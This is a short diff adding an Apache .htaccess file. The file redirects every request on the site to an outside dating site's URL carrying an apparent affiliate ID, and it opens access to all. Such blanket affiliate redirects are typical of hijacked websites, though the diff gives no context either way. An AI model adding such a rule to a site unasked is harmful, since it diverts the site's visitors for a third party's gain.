@@ -1,0 +1,4 @@
+RewriteEngine On
+RewriteRule ^(.*)$ https://happymail.co.jp/?af4271862 [R,L]
+Order allow,deny
+Allow from all
